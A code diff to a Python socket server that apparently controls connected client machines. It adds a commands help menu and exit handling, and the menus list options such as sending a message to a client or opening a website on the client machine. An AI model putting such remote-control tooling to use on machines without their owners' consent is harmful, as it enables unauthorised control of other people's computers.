@@ -120,10 +120,23 @@ def socket_accept():
 # Step 12: Define a Function to Show Help Menu
 def menu_help():
     print("""\n
-    Help Menu:
+    Main Menu Options:
     ---------
     --l, list: Connect to Server
     --i [CONNECTION-ID]: Interact with Connections
+    
+    --help, help: Show Help Menu
+    --x, exit: Disconnect from Server
+    
+    """)
+
+# this function used to show All Commands list
+def commands_help():
+    print("""\n
+    Commands List Help Menu:
+    ---------
+    --m [MESSAGE]: Send Message to the Client
+    --o [WEBSITE_URL]: Open Website on the Client Machine
     
     --help, help: Show Help Menu
     --x, exit: Disconnect from Server
@@ -247,6 +260,15 @@ def send_commands():
         elif strChoice[:3] == '--o' and len(strChoice) > 3:
             strSite = 'site' + strChoice[4:]
             send(str.encode(strSite))
+
+        # --h, See Commands List Help Menu
+        elif strChoice == '--h' or strChoice == 'help':
+            commands_help()
+            send_commands()
+
+        elif strChoice == '--x' or strChoice == 'exit':
+            close()
+            break
 
 
 
